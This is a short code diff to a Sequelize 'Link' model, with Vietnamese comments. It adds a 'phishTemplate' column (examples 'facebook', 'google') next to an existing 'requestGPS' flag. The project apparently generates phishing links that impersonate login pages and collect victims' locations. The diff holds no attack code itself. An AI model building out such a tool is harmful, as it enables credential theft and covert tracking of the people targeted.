@@ -20,12 +20,17 @@ const Link = sequelize.define('Link', {
         allowNull: false,
         defaultValue: false,
     },
-    // ---- CỘT CÀI ĐẶT MỚI ----
     requestGPS: {
         type: DataTypes.BOOLEAN,
         allowNull: false,
-        defaultValue: false, // Mặc định là TẮT
+        defaultValue: false,
     },
+    // ---- CỘT CÀI ĐẶT MỚI ----
+    phishTemplate: {
+        type: DataTypes.STRING, // Ví dụ: 'facebook', 'google', etc.
+        allowNull: true,
+        defaultValue: null // Mặc định là không có
+    }
 });
 
 module.exports = Link;
